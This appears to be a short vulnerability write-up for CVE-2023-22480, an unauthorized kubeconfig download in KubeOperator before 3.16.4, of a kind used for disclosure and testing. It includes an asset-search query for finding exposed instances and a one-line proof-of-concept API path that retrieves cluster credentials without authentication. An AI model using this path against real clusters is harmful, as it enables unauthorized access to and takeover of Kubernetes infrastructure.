# KubeOperator kubeconfig Unauthorized Access Vulnerability CVE-2023-22480

## Vulnerability Description

KubeOperator is an open source, lightweight Kubernetes distribution focused on helping enterprises plan, deploy and operate production-level Kubernetes clusters. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">KubeOperator  < 3.16.4</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="KubeOperator"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682430105792-11c93a6d-2d49-4c29-82a5-f387cef4bfc6.png)

Fixed unauthorized configuration file download interface in patch

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682430157296-4f0da22a-e1a3-44fc-aa39-cd55da6bc593.png)

When the cluster exists, the configuration file can be downloaded without authorization through the interface

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682430179027-436d1530-2754-48b8-92ad-726341f83dca.png)

Verify POC (k8s is the cluster name, not fixed)

```php
/api/v1/clusters/kubeconfig/k8s
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1682430278944-34ab7f8b-98df-4570-980c-0e2c7338ef75.png)